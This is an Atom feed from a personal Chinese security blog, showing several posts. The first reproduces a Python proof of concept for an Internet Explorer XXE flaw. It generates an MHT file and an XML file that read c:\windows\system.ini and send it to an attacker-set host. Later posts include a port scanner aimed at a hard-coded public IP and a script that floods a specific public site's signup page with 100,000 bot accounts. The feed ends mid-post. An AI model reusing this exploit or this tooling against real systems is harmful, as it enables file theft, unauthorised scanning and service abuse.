<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>My0Tang</title>
  
  <subtitle>网络安全爱好者</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://my0tang.github.io/"/>
  <updated>2019-04-16T03:10:12.098Z</updated>
  <id>https://my0tang.github.io/</id>
  
  <author>
    <name>My0Tang</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Internet Explorer XXE 漏洞复现</title>
    <link href="https://my0tang.github.io/2019/04/16/Internet-Explorer-XXE-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://my0tang.github.io/2019/04/16/Internet-Explorer-XXE-漏洞复现/</id>
    <published>2019-04-16T02:58:00.000Z</published>
    <updated>2019-04-16T03:10:12.098Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-使用Python生成相应的文件"><a href="#1-使用Python生成相应的文件" class="headerlink" title="1.使用Python生成相应的文件"></a>1.使用Python生成相应的文件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#Microsoft Internet Explorer XXE 0day</span><br><span class="line">#Creates malicious XXE .MHT and XML files</span><br><span class="line">#Open the MHT file in MSIE locally, should exfil system.ini</span><br><span class="line">#By hyp3rlinx </span><br><span class="line">#ApparitionSec</span><br><span class="line"></span><br><span class="line">ATTACKER_IP=&quot;localhost&quot;</span><br><span class="line">PORT=&quot;8000&quot;</span><br><span class="line"></span><br><span class="line">mht_file=(</span><br><span class="line">&apos;From:\n&apos;</span><br><span class="line">&apos;Subject:\n&apos;</span><br><span class="line">&apos;Date:\n&apos;</span><br><span class="line">&apos;MIME-Version: 1.0\n&apos;</span><br><span class="line">&apos;Content-Type: multipart/related; type=&quot;text/html&quot;;\n&apos;</span><br><span class="line">&apos;\tboundary=&quot;=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001&quot;\n&apos;</span><br><span class="line">&apos;This is a multi-part message in MIME format.\n\n\n&apos;</span><br><span class="line"></span><br><span class="line">&apos;--=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001\n&apos;</span><br><span class="line">&apos;Content-Type: text/html; charset=&quot;UTF-8&quot;\n&apos;</span><br><span class="line">&apos;Content-Location: main.htm\n\n&apos;</span><br><span class="line"></span><br><span class="line">&apos;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;http://www.w3.org/TR/html4/transitional.dtd&quot;&gt;\n&apos;</span><br><span class="line">&apos;&lt;html&gt;\n&apos;</span><br><span class="line">&apos;&lt;head&gt;\n&apos;</span><br><span class="line">&apos;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;\n&apos;</span><br><span class="line">&apos;&lt;title&gt;MSIE XXE 0day&lt;/title&gt;\n&apos;</span><br><span class="line">&apos;&lt;/head&gt;\n&apos;</span><br><span class="line">&apos;&lt;body&gt;\n&apos;</span><br><span class="line">&apos;&lt;xml&gt;\n&apos;</span><br><span class="line">&apos;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;\n&apos;</span><br><span class="line">&apos;&lt;!DOCTYPE r [\n&apos;</span><br><span class="line">&apos;&lt;!ELEMENT r ANY &gt;\n&apos;</span><br><span class="line">&apos;&lt;!ENTITY % sp SYSTEM &quot;http://&apos;+str(ATTACKER_IP)+&quot;:&quot;+PORT+&apos;/datatears.xml&quot;&gt;\n&apos;</span><br><span class="line">&apos;%sp;\n&apos;</span><br><span class="line">&apos;%param1;\n&apos;</span><br><span class="line">&apos;]&gt;\n&apos;</span><br><span class="line">&apos;&lt;r&gt;&amp;exfil;&lt;/r&gt;\n&apos;</span><br><span class="line">&apos;&lt;r&gt;&amp;exfil;&lt;/r&gt;\n&apos;</span><br><span class="line">&apos;&lt;r&gt;&amp;exfil;&lt;/r&gt;\n&apos;</span><br><span class="line">&apos;&lt;r&gt;&amp;exfil;&lt;/r&gt;\n&apos;</span><br><span class="line">&apos;&lt;/xml&gt;\n&apos;</span><br><span class="line">&apos;&lt;script&gt;window.print();&lt;/script&gt;\n&apos;</span><br><span class="line">&apos;&lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot;&gt;\n&apos;</span><br><span class="line">&apos;&lt;tr&gt;\n&apos;</span><br><span class="line">&apos;&lt;td class=&quot;contentcell-width&quot;&gt;\n&apos;</span><br><span class="line">&apos;&lt;h1&gt;MSIE XML External Entity 0day PoC.&lt;/h1&gt;\n&apos;</span><br><span class="line">&apos;&lt;h3&gt;Discovery: hyp3rlinx&lt;/h3&gt;\n&apos;</span><br><span class="line">&apos;&lt;h3&gt;ApparitionSec&lt;/h3&gt;\n&apos;</span><br><span class="line">&apos;&lt;/td&gt;\n&apos;</span><br><span class="line">&apos;&lt;/tr&gt;\n&apos;</span><br><span class="line">&apos;&lt;/table&gt;\n&apos;</span><br><span class="line">&apos;&lt;/body&gt;\n&apos;</span><br><span class="line">&apos;&lt;/html&gt;\n\n\n&apos;</span><br><span class="line"></span><br><span class="line">&apos;--=_NextPart_SMP_1d4d45cf4e8b3ee_3ddb1153_00000001--&apos;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">xml_file=(</span><br><span class="line">&apos;&lt;!ENTITY % data SYSTEM &quot;c:\windows\system.ini&quot;&gt;\n&apos;</span><br><span class="line">&apos;&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM \&apos;http://&apos;+str(ATTACKER_IP)+&quot;:&quot;+PORT+&apos;/?%data;\&apos;&gt;&quot;&gt;\n&apos;</span><br><span class="line">&apos;&lt;!ENTITY % data SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;\n&apos;</span><br><span class="line">&apos;&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM \&apos;http://&apos;+str(ATTACKER_IP)+&quot;:&quot;+PORT+&apos;/?%data;\&apos;&gt;&quot;&gt;\n&apos;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">def mk_msie_0day_filez(f,p):</span><br><span class="line">    f=open(f,&quot;wb&quot;)</span><br><span class="line">    f.write(p)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    mk_msie_0day_filez(&quot;msie-xxe-0day.mht&quot;,mht_file)</span><br><span class="line">    mk_msie_0day_filez(&quot;datatears.xml&quot;,xml_file)</span><br><span class="line">    print &quot;Microsoft Internet Explorer XML External Entity 0day PoC.&quot;</span><br><span class="line">    print &quot;Files msie-xxe-0day.mht and datatears.xml Created!.&quot;</span><br><span class="line">    print &quot;Discovery: Hyp3rlinx / Apparition Security&quot;</span><br></pre></td></tr></table></figure><p>以上脚本会在当前目录下生成两个文件，”msie-xxe-0day.mht”和”datatears.xml”<br><img src="/images/xxe/xxe1.jpg" alt></p><h1 id="2-启动Python服务器"><a href="#2-启动Python服务器" class="headerlink" title="2.启动Python服务器"></a>2.启动Python服务器</h1><p><code>python -m SimpleHTTPServer</code><br><img src="/images/xxe/xxe2.jpg" alt></p><h1 id="3-将生成的datatears-xml放在python服务器下面"><a href="#3-将生成的datatears-xml放在python服务器下面" class="headerlink" title="3.将生成的datatears.xml放在python服务器下面"></a>3.将生成的datatears.xml放在python服务器下面</h1><p><img src="/images/xxe/xxe3.jpg" alt></p><h1 id="4-打开生成的msie-xxe-0day-mht文件"><a href="#4-打开生成的msie-xxe-0day-mht文件" class="headerlink" title="4.打开生成的msie-xxe-0day.mht文件"></a>4.打开生成的msie-xxe-0day.mht文件</h1><p><img src="/images/xxe/xxe4.jpg" alt><br><img src="/images/xxe/xxe5.jpg" alt></p><h1 id="5-参考链接"><a href="#5-参考链接" class="headerlink" title="5.参考链接"></a>5.参考链接</h1><p><a href="https://www.anquanke.com/post/id/176647" target="_blank" rel="noopener">Internet Explorer XXE 漏洞预警</a></p><p><a href="http://hyp3rlinx.altervista.org/advisories/MICROSOFT-INTERNET-EXPLORER-v11-XML-EXTERNAL-ENTITY-INJECTION-0DAY.txt" target="_blank" rel="noopener">漏洞披露</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-使用Python生成相应的文件&quot;&gt;&lt;a href=&quot;#1-使用Python生成相应的文件&quot; class=&quot;headerlink&quot; title=&quot;1.使用Python生成相应的文件&quot;&gt;&lt;/a&gt;1.使用Python生成相应的文件&lt;/h1&gt;&lt;figure class
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://my0tang.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞复现" scheme="https://my0tang.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞复现" scheme="https://my0tang.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="XXE" scheme="https://my0tang.github.io/tags/XXE/"/>
    
      <category term="渗透测试" scheme="https://my0tang.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Python 简易端口扫描</title>
    <link href="https://my0tang.github.io/2019/04/12/Python-%E7%AE%80%E6%98%93%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-1/"/>
    <id>https://my0tang.github.io/2019/04/12/Python-简易端口扫描-1/</id>
    <published>2019-04-12T07:40:00.000Z</published>
    <updated>2019-04-12T07:41:04.751Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>使用队列 多线程方法</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">sys.path.append(&quot;..&quot;)</span><br><span class="line"></span><br><span class="line">import threading,socket,queue</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">lock = threading.Lock() # 线程锁</span><br><span class="line"></span><br><span class="line"># 扫描端口队列</span><br><span class="line">def GetQueue(host):</span><br><span class="line">    PortQueue = queue.Queue()</span><br><span class="line">    for port in range(1,65535):</span><br><span class="line">        PortQueue.put((host,port))</span><br><span class="line">    return PortQueue</span><br><span class="line"></span><br><span class="line">class ScanThread(threading.Thread):</span><br><span class="line">    def __init__(self,SingleQueue,outip):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.daemon = True</span><br><span class="line">        # self.setDaemon(True)</span><br><span class="line">        self.SingleQueue = SingleQueue</span><br><span class="line">        self.outip = outip</span><br><span class="line">    def ping(self,scanIP,port):</span><br><span class="line">        global OpenPort,Lock</span><br><span class="line">        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(1)</span><br><span class="line">        address = (scanIP,port)</span><br><span class="line">        try:</span><br><span class="line">            sock.connect(address)</span><br><span class="line">        except:</span><br><span class="line">            sock.close()</span><br><span class="line">            return False</span><br><span class="line">        sock.close()</span><br><span class="line">        print(scanIP, port)</span><br><span class="line">        if lock.acquire():</span><br><span class="line">            lock.release()</span><br><span class="line">        return True</span><br><span class="line">    def run(self):</span><br><span class="line">        while not self.SingleQueue.empty():</span><br><span class="line">            # print(self.SingleQueue.get())</span><br><span class="line">            host,port = self.SingleQueue.get()</span><br><span class="line">            self.ping(host,port)</span><br><span class="line"></span><br><span class="line">class Work():</span><br><span class="line">    def __init__(self,scan_id = &apos;&apos;,scan_target=&apos;&apos;,scan_type = &apos;&apos;,scan_args=&apos;&apos;,back_fn=None):</span><br><span class="line">        self.scan_id = scan_id</span><br><span class="line">        self.target = scan_target</span><br><span class="line">        self.scan_type = scan_type</span><br><span class="line">        self.args = scan_args</span><br><span class="line">        self.back_fn = back_fn</span><br><span class="line">        self.result= []</span><br><span class="line">    def run(self):</span><br><span class="line">        ThreadList = []</span><br><span class="line">        SingLeQueue = GetQueue(self.target)</span><br><span class="line">        resultQueue = queue.Queue()</span><br><span class="line">        for i in range(0,200):</span><br><span class="line">            t = ScanThread(SingLeQueue,resultQueue)</span><br><span class="line">            ThreadList.append(t)</span><br><span class="line">        for t in ThreadList:</span><br><span class="line">            t.start()</span><br><span class="line">        for t in ThreadList:</span><br><span class="line">            t.join()</span><br><span class="line">start_time = time.time()</span><br><span class="line">t = Work(scan_target = &quot;111.7.163.233&quot;)</span><br><span class="line">t.run()</span><br><span class="line">print(&apos;%d second&apos; % (time.time() - start_time))</span><br></pre></td></tr></table></figure><p>执行完成63S</p><blockquote><p>使用协程的方式</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import gevent</span><br><span class="line">from gevent import monkey</span><br><span class="line">from gevent.pool import Pool</span><br><span class="line">monkey.patch_all()</span><br><span class="line">import socket,time</span><br><span class="line"></span><br><span class="line">class work():</span><br><span class="line">    def __init__(self,scan_target = &quot;&quot;):</span><br><span class="line">        self.pool = Pool(200)</span><br><span class="line">        self.timeout=0.1</span><br><span class="line">        self.target = scan_target</span><br><span class="line">    def port_scan(self,port):</span><br><span class="line">        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(self.timeout)</span><br><span class="line">        try:</span><br><span class="line">            sock.connect((self.target,port))</span><br><span class="line">            print(self.target,&quot;:&quot;,port)</span><br><span class="line">        except:</span><br><span class="line">            sock.close()</span><br><span class="line">    def run(self):</span><br><span class="line">        res = []</span><br><span class="line">        for port in range(1,65535):</span><br><span class="line">            res.append(port)</span><br><span class="line">        self.pool.map(self.port_scan,res)</span><br><span class="line"></span><br><span class="line">start_time = time.time()</span><br><span class="line">t = work(&apos;127.0.0.1&apos;)</span><br><span class="line">t.run()</span><br><span class="line">print(&apos;%d second&apos; % (time.time() - start_time))</span><br></pre></td></tr></table></figure><p>扫描完成需155S</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;使用队列 多线程方法&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;
      
    
    </summary>
    
      <category term="Python" scheme="https://my0tang.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://my0tang.github.io/tags/Python/"/>
    
      <category term="端口扫描" scheme="https://my0tang.github.io/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>Python 简单的爬取网站状态码标题</title>
    <link href="https://my0tang.github.io/2019/04/06/Python-%E7%AE%80%E5%8D%95%E7%9A%84%E7%88%AC%E5%8F%96%E7%BD%91%E7%AB%99%E7%8A%B6%E6%80%81%E7%A0%81%E6%A0%87%E9%A2%98/"/>
    <id>https://my0tang.github.io/2019/04/06/Python-简单的爬取网站状态码标题/</id>
    <published>2019-04-06T15:24:00.000Z</published>
    <updated>2019-04-06T15:24:48.025Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line">import threadpool</span><br><span class="line">import traceback</span><br><span class="line">code_200 = []</span><br><span class="line">code_not200 = []</span><br><span class="line">_REGEX_ = &apos;&lt;title&gt;(.*)&lt;/title&gt;&apos;</span><br><span class="line">def getTitle(url):</span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        pattern = re.compile(_REGEX_, flags=re.IGNORECASE)</span><br><span class="line">        try:</span><br><span class="line">            title = re.findall(pattern, response.text)[0]</span><br><span class="line">        except IndexError:</span><br><span class="line">            title = &apos;无标题&apos;</span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            code_200.append(&#123;&apos;url&apos;:url,&apos;title&apos;:title,&quot;status_code&quot;:response.status_code&#125;)</span><br><span class="line">            print(&#123;&apos;url&apos;:url,&apos;title&apos;:title,&quot;status_code&quot;:response.status_code&#125;)</span><br><span class="line">            return</span><br><span class="line">        else:</span><br><span class="line">            code_not200.append(&#123;&apos;url&apos;:url,&apos;title&apos;:title,&quot;status_code&quot;:response.status_code&#125;)</span><br><span class="line">            print(&#123;&apos;url&apos;: url, &apos;title&apos;: title, &quot;status_code&quot;: response.status_code&#125;)</span><br><span class="line">            return</span><br><span class="line">    except Exception as e:</span><br><span class="line">        traceback.print_exc()</span><br><span class="line">        return 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    domain = []</span><br><span class="line">    with open(&apos;test5.txt&apos;,&apos;r&apos;) as f:</span><br><span class="line">        for i in f.readlines():</span><br><span class="line">            domain.append(i.strip())</span><br><span class="line">        f.close()</span><br><span class="line">    print(domain)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    pool = threadpool.ThreadPool(100)</span><br><span class="line">    requests_1 = threadpool.makeRequests(getTitle, domain)</span><br><span class="line">    [pool.putRequest(req) for req in requests_1]</span><br><span class="line">    pool.wait()</span><br><span class="line">    with open(&apos;test6.txt&apos;,&apos;w+&apos;,encoding=&apos;UTF-8&apos;) as f:</span><br><span class="line">        for i in code_200:</span><br><span class="line">            f.write(str(i) + &apos;\n&apos;)</span><br><span class="line">        for i in code_not200:</span><br><span class="line">            f.write(str(i) + &apos;\n&apos;)</span><br><span class="line">    print(&apos;%d second&apos; % (time.time() - start_time))</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
      <category term="Python" scheme="https://my0tang.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://my0tang.github.io/tags/Python/"/>
    
      <category term="子域名" scheme="https://my0tang.github.io/tags/%E5%AD%90%E5%9F%9F%E5%90%8D/"/>
    
  </entry>
  
  <entry>
    <title>Python asyncio or aiohttp 例子</title>
    <link href="https://my0tang.github.io/2019/04/05/Python-asyncio-or-aiohttp-%E4%BE%8B%E5%AD%90/"/>
    <id>https://my0tang.github.io/2019/04/05/Python-asyncio-or-aiohttp-例子/</id>
    <published>2019-04-05T14:20:53.000Z</published>
    <updated>2019-04-05T16:10:30.902Z</updated>
    
    <content type="html"><![CDATA[<p>在学习asyncio之前，我们先来理清楚同步/异步的概念：</p><p>同步是指完成事务的逻辑，先执行第一个事务，如果阻塞了，会一直等待，直到这个事务完成，再执行第二个事务，顺序执行。。。</p><p>异步是和同步相对的，异步是指在处理调用这个事务的之后，不会等待这个事务的处理结果，直接处理第二个事务去了，通过状态、通知、回调来通知调用者处理结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import asyncio,aiohttp</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">k = 1</span><br><span class="line">async def set_account(url,form,semaphore):</span><br><span class="line">    global k</span><br><span class="line">    try:</span><br><span class="line">        async with semaphore:</span><br><span class="line">            async with aiohttp.ClientSession() as session:</span><br><span class="line">                async with session.get(url,params=form) as resp:</span><br><span class="line">                    if &apos;注册成功&apos; in await resp.text():</span><br><span class="line">                        print(k)</span><br><span class="line">                        k=k+1</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = &apos;http://58.218.213.224:8889/zhuce.php&apos;</span><br><span class="line">tasks = []</span><br><span class="line">semaphore = asyncio.Semaphore(100)</span><br><span class="line">for i in range(100000):</span><br><span class="line">    dom = random.randint(100000,99999999)</span><br><span class="line">    username = &apos;qq&apos; + str(dom)</span><br><span class="line">    data = &#123;</span><br><span class="line">        &apos;username&apos;:username,</span><br><span class="line">        &apos;password&apos;:username,</span><br><span class="line">        &apos;repassword&apos;:username,</span><br><span class="line">        &apos;submit&apos;:&apos;注册&apos;</span><br><span class="line">    &#125;</span><br><span class="line">    tasks.append(set_account(url,data,semaphore))</span><br><span class="line"></span><br><span class="line">event_loop = asyncio.get_event_loop()</span><br><span class="line">results = event_loop.run_until_complete(asyncio.gather(*tasks))</span><br><span class="line">event_loop.close()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在学习asyncio之前，我们先来理清楚同步/异步的概念：&lt;/p&gt;
&lt;p&gt;同步是指完成事务的逻辑，先执行第一个事务，如果阻塞了，会一直等待，直到这个事务完成，再执行第二个事务，顺序执行。。。&lt;/p&gt;
&lt;p&gt;异步是和同步相对的，异步是指在处理调用这个事务的之后，不会等待这个事
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Python 简单的子域名存活判断</title>
    <link href="https://my0tang.github.io/2019/04/05/Python-%E7%AE%80%E5%8D%95%E7%9A%84%E5%AD%90%E5%9F%9F%E5%90%8D%E5%AD%98%E6%B4%BB%E5%88%A4%E6%96%AD-1/"/>
    <id>https://my0tang.github.io/2019/04/05/Python-简单的子域名存活判断-1/</id>
    <published>2019-04-05T11:11:00.000Z</published>
    <updated>2019-04-05T16:10:41.203Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>通过threading.Semaphore控制最大线程数量</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"># 线程最大数量</span><br><span class="line">sem=threading.Semaphore(100)</span><br><span class="line">cunhua = []</span><br><span class="line"># 访问URL，判断是否存活</span><br><span class="line">def URLIP(url):</span><br><span class="line">    sem.acquire()</span><br><span class="line">    port = [80,443]</span><br><span class="line">    for i in port:</span><br><span class="line">        url1 = &quot;http://%s:%s&quot;%(url,i)</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url1,timeout=4)</span><br><span class="line">            print(url1 + &quot;:&quot; + &quot;存活&quot;)</span><br><span class="line">            cunhua.append(url1)</span><br><span class="line">            break</span><br><span class="line">        except Exception as e:</span><br><span class="line">            # print(e)</span><br><span class="line">            pass</span><br><span class="line">        finally:</span><br><span class="line">            sem.release()</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    domain = []</span><br><span class="line">    threads = []</span><br><span class="line">    with open(&apos;test3.txt&apos;,&apos;r&apos;) as f:</span><br><span class="line">        for i in f.readlines():</span><br><span class="line">            t = threading.Thread(target=URLIP,args=(i.strip(),))</span><br><span class="line">            threads.append(t)</span><br><span class="line">        f.close()</span><br><span class="line">    for i in range(0,len(threads)):</span><br><span class="line">        threads[i].start()</span><br><span class="line">    for i in range(0,len(threads)):</span><br><span class="line">        threads[i].join()</span><br><span class="line">    with open(&apos;test4.txt&apos;,&apos;w+&apos;) as f:</span><br><span class="line">        for i in cunhua:</span><br><span class="line">            f.write(i.strip() + &apos;\n&apos;)</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure><blockquote><p>过时的threadpool模块</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 